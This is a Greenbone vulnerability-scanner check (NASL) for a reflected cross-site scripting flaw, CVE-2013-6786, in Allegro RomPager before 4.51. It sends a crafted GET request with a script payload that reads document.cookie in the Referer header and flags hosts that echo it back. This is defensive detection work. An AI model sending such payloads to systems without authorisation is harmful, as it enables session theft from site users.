# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:allegrosoft:rompager";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804079");
  script_version("2025-07-17T05:43:33+0000");
  script_cve_id("CVE-2013-6786");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2025-07-17 05:43:33 +0000 (Thu, 17 Jul 2025)");
  script_tag(name:"creation_date", value:"2014-01-23 12:26:46 +0530 (Thu, 23 Jan 2014)");
  script_name("Allegro RomPager < 4.51 HTTP Referer Header XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_allegro_rompager_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("allegro/rompager/http/detected");

  script_xref(name:"URL", value:"https://antoniovazquezblanco.github.io/docs/advisories/Advisory_RomPagerXSS.pdf");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210213170627/http://www.securityfocus.com/bid/63721");

  script_tag(name:"summary", value:"Allegro RomPager is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Flaws is due to the application does not validate input passed
  via the HTTP referer header before returning it to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Allegro Software Development Corporation RomPager version 4.07
  is known to be affected. Other versions may also be affected.");

  script_tag(name:"solution", value:"Update to version 4.51 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

host = http_host_name(port:port);

url = "/nonexistingdata";
req = string("GET ", url, ' HTTP/1.1\r\n',
             "Host: ", host, '\r\n',
             'Referer: http://test.com/"><script>alert(document.cookie)</script>\r\n\r\n');
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res &&
   "RomPager server" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
